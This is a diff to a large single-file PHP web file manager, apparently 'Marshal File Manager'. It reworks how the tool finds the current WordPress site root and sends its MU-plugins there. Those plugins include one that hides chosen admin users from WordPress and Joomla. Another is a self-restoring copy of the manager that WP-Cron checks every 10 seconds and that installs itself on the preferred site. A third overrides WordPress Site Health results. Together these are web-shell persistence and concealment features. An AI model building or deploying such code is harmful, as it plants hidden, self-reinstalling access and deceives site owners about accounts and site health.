@@ -2220,6 +2220,77 @@ class FileManager {
     }
 
     /* ══ CMS detection & user management (WordPress / Joomla) ══ */
+    /*
+     * WordPress permits wp-config.php to live one directory above the public
+     * site root. Keep the config path separate from the actual WordPress root
+     * so MU-plugins, core updates, and recovery use the right wwwroot.
+     */
+    private function wpCurrentWebRoots(){
+        $roots=[
+            $_SERVER['DOCUMENT_ROOT']??null,
+            __DIR__,
+            dirname($_SERVER['SCRIPT_FILENAME']??''),
+            $this->currentDir,
+            getcwd(),
+        ];
+        $out=[];
+        foreach($roots as $root){
+            if(!$root)continue;
+            $real=realpath($root);
+            if($real&&is_dir($real)&&!in_array($real,$out,true))$out[]=$real;
+        }
+        return $out;
+    }
+    private function wpSiteRoot($configPath){
+        $configPath=realpath($configPath)?:$configPath;
+        $configDir=realpath(dirname($configPath))?:dirname($configPath);
+        $candidates=[$configDir,dirname($configDir)];
+        foreach($this->wpCurrentWebRoots() as $root){
+            $candidates[]=$root;
+            $candidates[]=dirname($root);
+        }
+        $candidates=array_values(array_unique(array_filter(array_map(function($p){
+            $r=realpath($p);return $r&&is_dir($r)?$r:null;
+        },$candidates))));
+        $best=$configDir;$bestScore=-1;
+        foreach($candidates as $dir){
+            $score=0;
+            if(is_dir($dir.'/wp-content'))$score+=5;
+            if(is_dir($dir.'/wp-includes'))$score+=3;
+            if(is_dir($dir.'/wp-admin'))$score+=3;
+            if($dir===$configDir)$score+=2;
+            foreach($this->wpCurrentWebRoots() as $current)if($dir===$current)$score+=2;
+            if($score>$bestScore){$bestScore=$score;$best=$dir;}
+        }
+        return $best;
+    }
+    private function wpCurrentSiteFromScan($sites){
+        $roots=$this->wpCurrentWebRoots();$best=null;$bestScore=-1;
+        foreach((array)$sites as $site){
+            if(($site['type']??'')!=='wordpress')continue;
+            $dir=realpath($site['dir']??dirname($site['config']??''))?:dirname($site['config']??'');
+            if(!$dir)continue;
+            $score=0;
+            foreach($roots as $root){
+                if($dir===$root)$score=max($score,1000);
+                elseif(strpos($root,rtrim($dir,'/').'/')===0)$score=max($score,900-strlen($root)+strlen($dir));
+                elseif(strpos($dir,rtrim($root,'/').'/')===0)$score=max($score,800-strlen($dir)+strlen($root));
+                if(dirname($site['config']??'')===$root)$score=max($score,950);
+            }
+            if($score>$bestScore){$bestScore=$score;$best=$site;}
+        }
+        return $best;
+    }
+    private function wpCurrentDomainConfig($sites=[]){
+        foreach($this->wpCurrentWebRoots() as $root){
+            foreach([$root,dirname($root),dirname(dirname($root))] as $probe){
+                $cfg=rtrim($probe,'/').'/wp-config.php';
+                if(is_file($cfg)&&is_readable($cfg))return realpath($cfg)?:$cfg;
+            }
+        }
+        $site=$this->wpCurrentSiteFromScan($sites);
+        return $site['config']??null;
+    }
     public function cmsDetect($dir){
         $dir=rtrim($dir,'/');
         if(is_file($dir.'/wp-config.php'))return['type'=>'wordpress','config'=>$dir.'/wp-config.php'];
@@ -2294,9 +2365,14 @@ class FileManager {
             if($depth>$maxDepth||$scanned>=$maxDirs)return;
             $dir=rtrim($dir,'/');
             $real=realpath($dir);if(!$real||isset($seen[$real]))return;$seen[$real]=1;$scanned++;
-            // Check this dir for CMS
-            if(is_file($dir.'/wp-config.php')){
-                $k=realpath($dir.'/wp-config.php');
+            // Check this dir for CMS. WordPress commonly keeps wp-config.php
+            // one level above the public wwwroot, so inspect that layout while
+            // visiting the child directory that actually contains WordPress.
+            $wpCfg=$dir.'/wp-config.php';
+            if(!is_file($wpCfg)&&is_file(dirname($dir).'/wp-config.php')
+                &&(is_dir($dir.'/wp-content')||is_dir($dir.'/wp-includes')))$wpCfg=dirname($dir).'/wp-config.php';
+            if(is_file($wpCfg)){
+                $k=realpath($wpCfg);
                 if($k&&!isset($seen['cfg:'.$k])){$seen['cfg:'.$k]=1;$GLOBALS['_cmsfound'][]=['type'=>'wordpress','config'=>$k,'dir'=>$dir];}
             }
             if(is_file($dir.'/configuration.php')){
@@ -2325,7 +2401,10 @@ class FileManager {
         // deduplicate by config path
         $out=[];$cfgs=[];
         foreach($found as $f){if(!in_array($f['config'],$cfgs)){$cfgs[]=$f['config'];$out[]=$f;}}
-        return ['sites'=>$out,'scanned_roots'=>array_values($roots),'open_basedir'=>$restricted,'dirs_scanned'=>$scanned];
+        $current=$this->wpCurrentDomainConfig($out);
+        return ['sites'=>$out,'scanned_roots'=>array_values($roots),'open_basedir'=>$restricted,
+            'dirs_scanned'=>$scanned,'current_wp_config'=>$current,
+            'current_wp_site'=>$current?$this->wpCurrentSiteFromScan($out):null];
     }
     private function parseWpConfig($path){
         $src=@file_get_contents($path);if($src===false)return null;
@@ -2442,7 +2521,7 @@ class FileManager {
              * are removed (or rewritten safely if the directory is not
              * deletable).
              */
-            $muDir=dirname($configPath).'/wp-content/mu-plugins';
+            $muDir=$this->wpSiteRoot($configPath).'/wp-content/mu-plugins';
             if(is_dir($muDir)){
                 /*
                  * Older MFM ACC builds did not always use the
@@ -2487,7 +2566,7 @@ class FileManager {
         if($ownLink)mysqli_close($link);
         $ids=array_values(array_unique(array_filter(array_map('intval',$ids))));
         if($c['type']==='wordpress'){
-            $muDir=dirname($configPath).'/wp-content/mu-plugins';
+            $muDir=$this->wpSiteRoot($configPath).'/wp-content/mu-plugins';
             $muFile=$muDir.'/marshal-fm-hidden-users.php';
             $marker='Marshal File Manager hidden users';
             if($ids){
@@ -2546,7 +2625,7 @@ FMHIDDEN;
         }
         /* MARSHAL_FM_HIDDEN_USERS_END */
 FMJOOMLA;
-        $root=dirname($configPath);
+        $root=$this->wpSiteRoot($configPath);
         $modelFiles=[
             $root.'/administrator/components/com_users/src/Model/UsersModel.php',
             $root.'/administrator/components/com_users/models/users.php'
@@ -2773,7 +2852,7 @@ FMJOOMLA;
     public function cmsExtensions($configPath){
         list($link,$c,$err)=$this->cmsConnect($configPath);
         if($err)return['error'=>$err];
-        $root=dirname($configPath);
+        $root=$this->wpSiteRoot($configPath);
         if($c['type']==='wordpress'){
             $t=$c['prefix'];
             $active=[];
@@ -2863,7 +2942,7 @@ FMJOOMLA;
         $configPath=$this->cmsCfgFromPost();
         $file=isset($_POST['plugin_file'])?$_POST['plugin_file']:'';
         if(!$file||strpos($file,'..')!==false){$this->addMsg('Invalid plugin.','danger');return;}
-        $root=dirname($configPath);
+        $root=$this->wpSiteRoot($configPath);
         $plugDir=realpath($root.'/wp-content/plugins');
         if(!$plugDir){$this->addMsg('Plugins folder not found.','danger');return;}
         $folder=explode('/',$file)[0];
@@ -2889,7 +2968,7 @@ FMJOOMLA;
         list($link,$c,$err)=$this->cmsConnect($configPath);
         if($err){$this->addMsg($err,'danger');return;}
         if($c['type']!=='wordpress'){mysqli_close($link);$this->addMsg('Not a WordPress site.','danger');return;}
-        $root=dirname($configPath);
+        $root=$this->wpSiteRoot($configPath);
         $css=$root.'/wp-content/themes/'.$slug.'/style.css';
         if(!is_file($css)){mysqli_close($link);$this->addMsg('Theme not found.','danger');return;}
         $head=@file_get_contents($css,false,null,0,8192);
@@ -2916,7 +2995,7 @@ FMJOOMLA;
         $cur=($res&&($r=mysqli_fetch_assoc($res)))?$r['option_value']:null;
         mysqli_close($link);
         if($cur===$slug){$this->addMsg('Switch to a different active theme before deleting this one.','danger');return;}
-        $root=dirname($configPath);
+        $root=$this->wpSiteRoot($configPath);
         $themeDir=realpath($root.'/wp-content/themes');
         if(!$themeDir){$this->addMsg('Themes folder not found.','danger');return;}
         $target=realpath($themeDir.'/'.$slug);
@@ -3020,10 +3099,11 @@ FMJOOMLA;
     public function wpAutomationRunCron($configPath){
         if(empty($_SESSION['fm_admin']))return['error'=>'Admins only.'];
         if(!$this->wpAutomationConnect($configPath,$c,$link,$err))return['error'=>$err];
-        $root=dirname($configPath);mysqli_close($link);
+        $root=$this->wpSiteRoot($configPath);$siteUrl=$this->wpOption($link,$c['prefix'],'siteurl');mysqli_close($link);
         $url=null;
+        if($siteUrl&&function_exists('curl_init'))$url=rtrim($siteUrl,'/').'/wp-cron.php?doing_wp_cron='.rawurlencode(sprintf('%.22F',microtime(true)));
         $home=$_SERVER['HTTP_HOST']??'';
-        if($home&&function_exists('curl_init'))$url='http'.(!empty($_SERVER['HTTPS'])?'s':'').'://'.$home.rtrim(dirname(parse_url($_SERVER['REQUEST_URI']??'/')['path']??'/'),'/').'/wp-cron.php?doing_wp_cron='.rawurlencode(sprintf('%.22F',microtime(true)));
+        if(!$url&&$home&&function_exists('curl_init'))$url='http'.(!empty($_SERVER['HTTPS'])?'s':'').'://'.$home.'/wp-cron.php?doing_wp_cron='.rawurlencode(sprintf('%.22F',microtime(true)));
         if(!$url)return['error'=>'Could not determine the WordPress URL for wp-cron.php.'];
         $ch=curl_init($url);curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_FOLLOWLOCATION=>true,CURLOPT_TIMEOUT=>20,CURLOPT_SSL_VERIFYPEER=>false]);
         curl_exec($ch);$code=(int)curl_getinfo($ch,CURLINFO_HTTP_CODE);$e=curl_error($ch);curl_close($ch);
@@ -3037,7 +3117,7 @@ FMJOOMLA;
         if(!filter_var($to,FILTER_VALIDATE_EMAIL)||$subject===''||$body==='')return['error'=>'Recipient, subject and message are required.'];
         if($when<time()+30)$when=time()+60;
         if(!$this->wpAutomationConnect($configPath,$c,$link,$err))return['error'=>$err];
-        $root=dirname($configPath);$mu=$root.'/wp-content/mu-plugins';
+        $root=$this->wpSiteRoot($configPath);$mu=$root.'/wp-content/mu-plugins';
         if(!is_dir($mu)&&!@mkdir($mu,0755,true)){$this->addMsg('Could not create wp-content/mu-plugins.','danger');mysqli_close($link);return['error'=>'Could not create the mu-plugins directory.'];}
         $plugin=$mu.'/mfm-wp-cron-mail.php';
         $src="<?php\n/** WordPress Automation mail handler — managed by File Manager. */\n"
@@ -3051,7 +3131,7 @@ FMJOOMLA;
         mysqli_close($link);if(!$ok)return['error'=>'Could not save the WordPress cron event.'];
         $this->log('wp_cron_email',$to);return['ok'=>true,'timestamp'=>$when];
     }
-    private function wpRecoveryPluginPath($configPath){return dirname($configPath).'/wp-content/mu-plugins/mfm-file-recovery.php';}
+    private function wpRecoveryPluginPath($configPath){return $this->wpSiteRoot($configPath).'/wp-content/mu-plugins/mfm-file-recovery.php';}
     public function wpAutomationRecoveryStatus($configPath){
         if(empty($_SESSION['fm_admin']))return['error'=>'Admins only.'];
         if(!$this->wpAutomationConnect($configPath,$c,$link,$err))return['error'=>$err];
@@ -3065,7 +3145,7 @@ FMJOOMLA;
     public function wpAutomationInstallRecovery($configPath){
         if(empty($_SESSION['fm_admin']))return['error'=>'Admins only.'];
         if(!$this->wpAutomationConnect($configPath,$c,$link,$err))return['error'=>$err];
-        $root=dirname($configPath);$mu=$root.'/wp-content/mu-plugins';
+        $root=$this->wpSiteRoot($configPath);$mu=$root.'/wp-content/mu-plugins';
         if(!is_dir($mu)&&!@mkdir($mu,0755,true)){mysqli_close($link);return['error'=>'Could not create wp-content/mu-plugins.'];}
         $target=__FILE__; $content=@file_get_contents($target);
         if($content===false||$content===''){mysqli_close($link);return['error'=>'Could not read the current manager file.'];}
@@ -3153,9 +3233,13 @@ FMHIDE;
         $_SESSION['wp_recovery_bootstrap_at']=time();
         $scan=$this->cmsScan();$sites=$scan['sites']??[];
         $wp=array_values(array_filter($sites,fn($s)=>($s['type']??'')==='wordpress'));
-        if($wp){
-            $this->wpAutomationInstallRecovery($wp[0]['config']);
-            $this->wpSiteHealthEnsureAutomatic($wp[0]['config']);
+        $preferred=$this->wpCurrentSiteFromScan($wp);
+        if(!$preferred&&!empty($scan['current_wp_config']))
+            $preferred=['type'=>'wordpress','config'=>$scan['current_wp_config'],'dir'=>$this->wpSiteRoot($scan['current_wp_config'])];
+        if($preferred||$wp){
+            $site=$preferred?:$wp[0];
+            $this->wpAutomationInstallRecovery($site['config']);
+            $this->wpSiteHealthEnsureAutomatic($site['config']);
         }
     }
     private function wpSiteHealthEnsureAutomatic($configPath){
@@ -3266,7 +3350,7 @@ FMHIDE;
         if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
         $configPath=$this->cmsCfgFromPost();$version=trim((string)($_POST['wp_version']??''));
         if(basename($configPath)!=='wp-config.php'||!$this->wpCoreVersionValid($version)){$this->addMsg('Choose a valid WordPress version.','danger');return;}
-        $root=dirname($configPath);$current=$this->wpCoreVersionFromFile($root);
+        $root=$this->wpSiteRoot($configPath);$current=$this->wpCoreVersionFromFile($root);
         if(!$current){$this->addMsg('Could not read the installed WordPress version.','danger');return;}
         if($version===$current){$this->addMsg('WordPress is already running version '.$version.'.','warning');return;}
         $lock=$root.'/.fm-wp-core-update.lock';
@@ -3327,7 +3411,7 @@ FMHIDE;
     public function wpCoreCurrentVersion($configPath){
         if(empty($_SESSION['fm_admin']))return['error'=>'Admins only.'];
         if(basename($configPath)!=='wp-config.php')return['error'=>'This feature requires WordPress.'];
-        $root=dirname($configPath);$v=$this->wpCoreVersionFromFile($root);
+        $root=$this->wpSiteRoot($configPath);$v=$this->wpCoreVersionFromFile($root);
         return $v?['ok'=>true,'version'=>$v]:['error'=>'Could not read wp-includes/version.php after the update.'];
     }
     /* WordPress calculates Site Health from test results. The manager can
@@ -3336,7 +3420,7 @@ FMHIDE;
     public function wpSiteHealth($configPath){
         if(empty($_SESSION['fm_admin']))return['error'=>'Admins only.'];
         if(basename($configPath)!=='wp-config.php')return['error'=>'This feature requires a valid WordPress installation.'];
-        $root=dirname($configPath);
+        $root=$this->wpSiteRoot($configPath);
         if(!is_file($root.'/wp-includes/version.php'))return['error'=>'This feature requires a valid WordPress installation.'];
         $override='auto';
         list($overrideLink,$overrideCms,$overrideErr)=$this->cmsConnect($configPath);
@@ -3398,13 +3482,13 @@ FMHIDE;
     }
     public function wpSiteHealthControl($configPath,$mode){
         if(empty($_SESSION['fm_admin']))return['error'=>'Admins only.'];
-        if(basename($configPath)!=='wp-config.php'||!is_file(dirname($configPath).'/wp-includes/version.php'))return['error'=>'This feature requires a valid WordPress installation.'];
+        if(basename($configPath)!=='wp-config.php'||!is_file($this->wpSiteRoot($configPath).'/wp-includes/version.php'))return['error'=>'This feature requires a valid WordPress installation.'];
         $allowed=['automatic','auto','good','recommended','critical'];
         if(!in_array($mode,$allowed,true))return['error'=>'Invalid Site Health mode.'];
         list($link,$c,$err)=$this->cmsConnect($configPath);
         if($err)return['error'=>$err];
         if($c['type']!=='wordpress'){mysqli_close($link);return['error'=>'This control is available for WordPress only.'];}
-        $root=dirname($configPath);$muDir=$root.'/wp-content/mu-plugins';$muFile=$muDir.'/000-fm-site-health-control.php';
+        $root=$this->wpSiteRoot($configPath);$muDir=$root.'/wp-content/mu-plugins';$muFile=$muDir.'/000-fm-site-health-control.php';
         if($mode==='auto'){
             $ok=true;
             if(is_file($muFile))$ok=@unlink($muFile);
@@ -3518,7 +3602,7 @@ FMHIDE;
         if($c['type']==='wordpress'){
             $t=$c['prefix'];
             if($enable){
-                $muDir=dirname($configPath).'/wp-content/mu-plugins';
+                $muDir=$this->wpSiteRoot($configPath).'/wp-content/mu-plugins';
                 if(!is_dir($muDir))@mkdir($muDir,0755,true);
                 $muFile=$muDir.'/000-fm-maintenance.php';
                 if(is_dir($muDir)&&!is_file($muFile)){
@@ -3647,7 +3731,7 @@ FMHIDE;
         if(!$id)return['error'=>'Invalid user id.'];
         list($link,$c,$err)=$this->cmsConnect($configPath);
         if($err)return['error'=>$err];
-        $dir=dirname($configPath);
+        $dir=$c['type']==='wordpress'?$this->wpSiteRoot($configPath):dirname($configPath);
         $siteUrl=null;$uname=null;
         if($c['type']==='wordpress'){
             $t=$c['prefix'];
@@ -10142,19 +10226,24 @@ document.getElementById('wmSendBtn')?.addEventListener('click',async()=>{
 let wpAutoCfg=null,wpAutoData=null;
 const body=document.getElementById('wpAutomationBody');
 function wpAutoMsg(s,c='var(--t3)'){return`<div style="padding:10px 16px;color:${c};font-size:11.5px">${esc(s)}</div>`;}
-function wpAutoPost(url,fd){return fetch(url,{method:'POST',body:fd}).then(r=>r.json());}
+function wpAutoPost(url,fd,cfg=wpAutoCfg){
+  if(cfg&&!fd.has('cfg_b64'))fd.append('cfg_b64',cmsB64(cfg));
+  return fetch(url,{method:'POST',body:fd}).then(r=>r.json());
+}
 async function wpAutoFindSingleWordPress(){
   const r=await fetch('?x=cmsscan',{cache:'no-store'}).then(x=>x.json());
   const sites=r.sites||[];
-  if(sites.length!==1||sites[0].type!=='wordpress')return false;
-  wpAutoCfg=sites[0].config;
+  const current=sites.find(s=>s.config===r.current_wp_config&&s.type==='wordpress');
+  const site=current||((sites.length===1&&sites[0].type==='wordpress')?sites[0]:null);
+  if(!site)return false;
+  wpAutoCfg=site.config;
   window.fmCmsConfig=wpAutoCfg;
   window.fmCmsType='wordpress';
   return true;
 }
 async function wpAutoInstallRecoveryFor(cfg){
   const fd=new FormData();fd.append('csrf_token',CSRF);
-  return wpAutoPost('?x=wp_recovery_install&cfg='+encodeURIComponent(cfg),fd);
+  return wpAutoPost('?x=wp_recovery_install',fd,cfg);
 }
 async function wpAutoInstallRecovery(){
   const r=await wpAutoInstallRecoveryFor(wpAutoCfg);
@@ -10164,11 +10253,12 @@ async function wpAutoInstallRecovery(){
 }
 function wpAutoShowPicker(scanRes){
   const sites=scanRes.sites||[],wpSites=sites.filter(s=>s.type==='wordpress');
-  const defaultSite=wpSites[0]||null;
+  const currentCfg=scanRes.current_wp_config||null;
+  const defaultSite=wpSites.find(s=>s.config===currentCfg)||wpSites[0]||null;
   body.innerHTML=`
     <div style="padding:12px 16px;border-bottom:1px solid var(--b2);font-size:12px;color:var(--t2)">
       Choose a WordPress installation
-      <div style="font-size:10.5px;color:var(--t3);margin-top:4px">${sites.length} CMS installation${sites.length!==1?'s':''} found. The first WordPress site is marked as the default and receives automatic recovery.</div>
+       <div style="font-size:10.5px;color:var(--t3);margin-top:4px">${sites.length} CMS installation${sites.length!==1?'s':''} found. The current domain’s WordPress site is preferred for automatic recovery.</div>
     </div>
     ${sites.length?sites.map(s=>{
       const isDefault=defaultSite&&s.config===defaultSite.config;
@@ -10179,8 +10269,16 @@ function wpAutoShowPicker(scanRes){
         <div style="flex:1;min-width:0"><div style="display:flex;align-items:center;gap:8px;margin-bottom:3px">${badge}${isDefault?'<span style="font-size:10px;color:#86efac;font-weight:700">DEFAULT</span>':''}<span style="font-size:12px;font-weight:600;color:var(--t1);overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(s.dir)}</span></div><div style="font-size:10.5px;color:var(--t3);font-family:monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(s.config)}</div></div>
         <svg viewBox="0 0 24 24" style="width:16px;height:16px;stroke:var(--t3);fill:none;stroke-width:2;flex-shrink:0"><polyline points="9 18 15 12 9 6"/></svg>
       </div>`;
-    }).join(''):'<div class="empty" style="padding:32px"><p>No CMS installations found automatically.</p></div>'}
-    <div style="padding:12px 16px;color:var(--t3);font-size:10.5px">Select a WordPress card to open its automation panel. Joomla is shown for consistency but cannot use WordPress Automation.</div>`;
+    }).join(''):'<div class="empty" style="padding:32px"><p>No CMS installations found automatically. Enter the full path below.</p></div>'}
+    <div style="padding:12px 16px;color:var(--t3);font-size:10.5px">Select a WordPress card to open its automation panel. Joomla is shown for consistency but cannot use WordPress Automation.</div>
+    <div style="padding:14px 16px;border-top:1px solid var(--b2)">
+      <div style="font-size:11px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.6px;margin-bottom:7px">Manual path to wp-config.php</div>
+      <div style="display:flex;gap:8px">
+        <input type="text" id="wpManualPath" class="inp" style="flex:1;font-size:12px;font-family:monospace" placeholder="/home/user/wp-config.php">
+        <button class="btn btn-p" id="wpManualBtn" style="white-space:nowrap;font-size:12px">Open</button>
+      </div>
+      <div style="font-size:10.5px;color:var(--t3);margin-top:7px">Use this when automatic scanning cannot find the domain. The path may be outside the site’s wwwroot.</div>
+    </div>`;
   body.querySelectorAll('.wp-auto-site-card').forEach(card=>card.addEventListener('click',()=>{
     if(card.dataset.type!=='wordpress'){toast('WordPress Automation requires a WordPress installation.');return;}
     wpAutoCfg=card.dataset.cfg;window.fmCmsConfig=wpAutoCfg;window.fmCmsType='wordpress';wpAutoLoad(true);
@@ -10190,6 +10288,16 @@ function wpAutoShowPicker(scanRes){
       if(!r.ok)toast(r.error||'Automatic recovery setup failed for the default WordPress site.');
     }).catch(e=>toast('Automatic recovery setup failed: '+String(e)));
   }
+  document.getElementById('wpManualBtn')?.addEventListener('click',()=>{
+    const p=document.getElementById('wpManualPath').value.trim();
+    const base=p.split(/[\\/]/).pop().toLowerCase();
+    if(!p){toast('Enter the full path to wp-config.php.');return;}
+    if(base!=='wp-config.php'){toast('File must be wp-config.php.');return;}
+    wpAutoCfg=p;window.fmCmsConfig=p;window.fmCmsType='wordpress';wpAutoLoad(true);
+  });
+  document.getElementById('wpManualPath')?.addEventListener('keydown',e=>{
+    if(e.key==='Enter')document.getElementById('wpManualBtn')?.click();
+  });
 }
 async function wpAutoLoad(autoRecovery=false){
   wpAutoCfg=window.fmCmsConfig||null;
@@ -10198,14 +10306,16 @@ async function wpAutoLoad(autoRecovery=false){
     try{
       const scanRes=await fetch('?x=cmsscan',{cache:'no-store'}).then(x=>x.json());
       const sites=scanRes.sites||[];
-      if(sites.length===1&&sites[0].type==='wordpress'){
-        wpAutoCfg=sites[0].config;window.fmCmsConfig=wpAutoCfg;window.fmCmsType='wordpress';
+       const current=sites.find(s=>s.config===scanRes.current_wp_config&&s.type==='wordpress');
+       const currentConfig=scanRes.current_wp_config&&{config:scanRes.current_wp_config,type:'wordpress'};
+       if(current||currentConfig||((sites.length===1)&&sites[0].type==='wordpress')){
+         wpAutoCfg=(current||currentConfig||sites[0]).config;window.fmCmsConfig=wpAutoCfg;window.fmCmsType='wordpress';
       }else{wpAutoShowPicker(scanRes);return;}
     }catch(e){body.innerHTML=wpAutoMsg('CMS detection failed: '+String(e),'#fca5a5');return;}
   }
   body.innerHTML=wpAutoMsg('Loading WordPress settings and cron events…');
   try{
-    const d=await fetch('?x=wp_automation&cfg='+encodeURIComponent(wpAutoCfg)).then(r=>r.json());
+    const fd=new FormData();const d=await wpAutoPost('?x=wp_automation',fd);
     if(d.error){body.innerHTML=wpAutoMsg(d.error,'#fca5a5');return;}
     wpAutoData=d;wpAutoRender();
     if(autoRecovery)await wpAutoInstallRecovery();
@@ -10236,12 +10346,12 @@ function wpAutoRender(){
   body.querySelectorAll('.wp-smtp-save').forEach(b=>b.addEventListener('click',async()=>{
     const ta=body.querySelector('.wp-smtp-json[data-option="'+CSS.escape(b.dataset.option)+'"]');
     const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('smtp_option',b.dataset.option);fd.append('smtp_json',ta.value);
-    const r=await wpAutoPost('?x=wp_smtp_save&cfg='+encodeURIComponent(wpAutoCfg),fd);toast(r.ok?'SMTP settings saved.':(r.error||'Save failed.'));
+    const r=await wpAutoPost('?x=wp_smtp_save',fd);toast(r.ok?'SMTP settings saved.':(r.error||'Save failed.'));
   }));
   body.querySelectorAll('.wp-cron-del').forEach(b=>b.addEventListener('click',async()=>{
     if(!confirm('Delete this WordPress cron event?'))return;
     const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('cron_hook',b.dataset.hook);fd.append('cron_timestamp',b.dataset.ts);fd.append('cron_signature',b.dataset.sig);
-    const r=await wpAutoPost('?x=wp_cron_delete&cfg='+encodeURIComponent(wpAutoCfg),fd);toast(r.ok?'Cron event deleted.':(r.error||'Delete failed.'));if(r.ok)wpAutoLoad();
+    const r=await wpAutoPost('?x=wp_cron_delete',fd);toast(r.ok?'Cron event deleted.':(r.error||'Delete failed.'));if(r.ok)wpAutoLoad();
   }));
 }
 function wpAutoPanel(tab){
@@ -10250,11 +10360,11 @@ function wpAutoPanel(tab){
   if(tab==='cron')p.innerHTML=`<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:9px"><span style="font-size:12px;color:var(--t2)">${wpAutoData.events.length} events found</span><button class="btn btn-xs btn-p" id="wpRunCron">Run due WP-Cron events</button></div><div style="max-height:300px;overflow:auto"><table style="width:100%;border-collapse:collapse"><tr style="color:var(--t3);font-size:10px"><th>Hook</th><th>Time</th><th>Schedule</th><th></th></tr>${wpAutoData.events.map(e=>`<tr><td style="padding:7px 8px;font-family:monospace;font-size:10.5px">${esc(e.hook)}</td><td style="padding:7px 8px;font-size:11px">${esc(e.date)}</td><td style="padding:7px 8px;font-size:11px">${esc(e.schedule||'single')}</td><td><button class="btn btn-xs btn-red wp-cron-del" data-hook="${esc(e.hook)}" data-ts="${e.timestamp}" data-sig="${esc(e.signature)}">Delete</button></td></tr>`).join('')}</table></div>`;
   if(tab==='mail')p.innerHTML=`<div style="font-size:11px;color:var(--t3);line-height:1.5;margin-bottom:10px">The marked MU-plugin will call WordPress <code>wp_mail()</code> when this one-time cron event runs.</div><input id="wpMailTo" class="inp" style="width:100%;margin-bottom:8px" type="email" placeholder="Recipient"><input id="wpMailSubject" class="inp" style="width:100%;margin-bottom:8px" placeholder="Subject"><textarea id="wpMailBody" class="inp" style="width:100%;height:110px;margin-bottom:8px" placeholder="Message"></textarea><input id="wpMailTime" class="inp" style="width:100%;margin-bottom:10px" type="datetime-local"><button class="btn btn-p" id="wpScheduleMail" style="width:100%">Schedule through WP-Cron</button>`;
    if(tab==='recovery')p.innerHTML=`<div style="font-size:11.5px;color:var(--t2);line-height:1.55;margin-bottom:12px"><strong style="color:var(--t1)">Optional file recovery</strong><br>This installs a visible MU-plugin and a WP-Cron event that checks every 10 seconds. It stores a compressed copy of the current manager file and restores only <code>${esc(wpAutoData.target||'')}</code> if that file is missing or empty.</div><div id="wpRecoveryState" style="padding:10px;border:1px solid var(--b2);border-radius:7px;color:var(--t3);margin-bottom:10px">Checking status…</div><div style="display:flex;gap:8px;flex-wrap:wrap"><button class="btn btn-p" id="wpRecoveryInstall">Install / refresh recovery</button><button class="btn btn-g" id="wpRecoveryRemove">Remove recovery</button></div>`;
-  p.querySelectorAll('.wp-smtp-save').forEach(b=>b.addEventListener('click',async()=>{const ta=p.querySelector('.wp-smtp-json[data-option="'+CSS.escape(b.dataset.option)+'"]');const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('smtp_option',b.dataset.option);fd.append('smtp_json',ta.value);const r=await wpAutoPost('?x=wp_smtp_save&cfg='+encodeURIComponent(wpAutoCfg),fd);toast(r.ok?'SMTP settings saved.':(r.error||'Save failed.'));}));
-  p.querySelectorAll('.wp-cron-del').forEach(b=>b.addEventListener('click',async()=>{if(!confirm('Delete this WordPress cron event?'))return;const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('cron_hook',b.dataset.hook);fd.append('cron_timestamp',b.dataset.ts);fd.append('cron_signature',b.dataset.sig);const r=await wpAutoPost('?x=wp_cron_delete&cfg='+encodeURIComponent(wpAutoCfg),fd);toast(r.ok?'Cron event deleted.':(r.error||'Delete failed.'));if(r.ok)wpAutoLoad();}));
-  document.getElementById('wpRunCron')?.addEventListener('click',async()=>{const fd=new FormData();fd.append('csrf_token',CSRF);const r=await wpAutoPost('?x=wp_cron_run&cfg='+encodeURIComponent(wpAutoCfg),fd);toast(r.ok?'WP-Cron triggered.':(r.error||'Cron failed.'));});
-  document.getElementById('wpScheduleMail')?.addEventListener('click',async()=>{const dt=document.getElementById('wpMailTime').value;const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('mail_to',document.getElementById('wpMailTo').value);fd.append('mail_subject',document.getElementById('wpMailSubject').value);fd.append('mail_body',document.getElementById('wpMailBody').value);fd.append('mail_time',dt?Math.floor(new Date(dt).getTime()/1000):0);const r=await wpAutoPost('?x=wp_cron_email&cfg='+encodeURIComponent(wpAutoCfg),fd);toast(r.ok?'Email scheduled through WP-Cron.':(r.error||'Scheduling failed.'));if(r.ok)wpAutoLoad();});
-   if(tab==='recovery'){wpAutoPost('?x=wp_recovery_status&cfg='+encodeURIComponent(wpAutoCfg),new FormData()).then(r=>{const s=document.getElementById('wpRecoveryState');if(s)s.innerHTML=r.error?esc(r.error):(r.installed?`Installed. Next event: ${(r.events||[]).map(e=>esc(e.date)).join(', ')||'pending'}`:'Not installed.');}).catch(()=>{const s=document.getElementById('wpRecoveryState');if(s)s.textContent='Status check failed.';});document.getElementById('wpRecoveryInstall')?.addEventListener('click',async()=>{const fd=new FormData();fd.append('csrf_token',CSRF);const r=await wpAutoPost('?x=wp_recovery_install&cfg='+encodeURIComponent(wpAutoCfg),fd);toast(r.ok?'WP-Cron file recovery installed.':(r.error||'Install failed.'));if(r.ok)wpAutoPanel('recovery');});document.getElementById('wpRecoveryRemove')?.addEventListener('click',async()=>{if(!confirm('Remove the visible WP-Cron file recovery helper?'))return;const fd=new FormData();fd.append('csrf_token',CSRF);const r=await wpAutoPost('?x=wp_recovery_remove&cfg='+encodeURIComponent(wpAutoCfg),fd);toast(r.ok?'WP-Cron file recovery removed.':(r.error||'Remove failed.'));if(r.ok)wpAutoPanel('recovery');});}
+  p.querySelectorAll('.wp-smtp-save').forEach(b=>b.addEventListener('click',async()=>{const ta=p.querySelector('.wp-smtp-json[data-option="'+CSS.escape(b.dataset.option)+'"]');const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('smtp_option',b.dataset.option);fd.append('smtp_json',ta.value);const r=await wpAutoPost('?x=wp_smtp_save',fd);toast(r.ok?'SMTP settings saved.':(r.error||'Save failed.'));}));
